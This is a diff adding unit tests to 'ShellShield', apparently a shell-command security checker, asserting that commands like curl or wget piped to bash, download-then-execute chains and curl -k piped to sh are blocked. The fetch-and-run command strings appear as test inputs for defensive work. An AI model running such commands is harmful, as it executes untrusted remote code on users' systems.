@@ -63,6 +63,12 @@ describe("ShellShield - Advanced Security (Tirith-inspired)", () => {
       expect(result.reason).toContain("PIPE-TO-SHELL");
     });
 
+    test("blocks multi-stage pipeline ending in shell", () => {
+      const result = analyze("curl -sSL https://example.com/malicious.sh | cat | bash");
+      expect(result.blocked).toBe(true);
+      expect(result.reason).toContain("PIPE-TO-SHELL");
+    });
+
     test("blocks process substitution from curl", () => {
       const result = analyze("bash <(curl -sSL https://example.com)");
       expect(result.blocked).toBe(true);
@@ -100,6 +106,18 @@ describe("ShellShield - Advanced Security (Tirith-inspired)", () => {
       expect(result.blocked).toBe(true);
       expect(result.reason).toContain("DOWNLOAD-AND-EXEC");
     });
+
+    test("blocks download-and-exec with curl -O", () => {
+      const result = analyze("curl -sSLO https://example.com/install.sh && bash install.sh");
+      expect(result.blocked).toBe(true);
+      expect(result.reason).toContain("DOWNLOAD-AND-EXEC");
+    });
+
+    test("blocks download-and-exec with wget default output file", () => {
+      const result = analyze("wget https://example.com/install.sh && sh install.sh");
+      expect(result.blocked).toBe(true);
+      expect(result.reason).toContain("DOWNLOAD-AND-EXEC");
+    });
   });
 
   describe("Dotfile / Sensitive Path Targeting", () => {
@@ -125,6 +143,14 @@ describe("ShellShield - Advanced Security (Tirith-inspired)", () => {
 
     test("blocks curl -k piped to shell", () => {
       const result = analyze("curl -k https://example.com/script.sh | sh");
+      expect(result.blocked).toBe(true);
+      expect(result.reason).toContain("INSECURE TRANSPORT");
+    });
+
+    test("blocks trusted domain when TLS validation is disabled", () => {
+      const result = analyze(
+        "curl -k https://raw.githubusercontent.com/user/repo/main/install.sh | bash"
+      );
       expect(result.blocked).toBe(true);
       expect(result.reason).toContain("INSECURE TRANSPORT");
     });
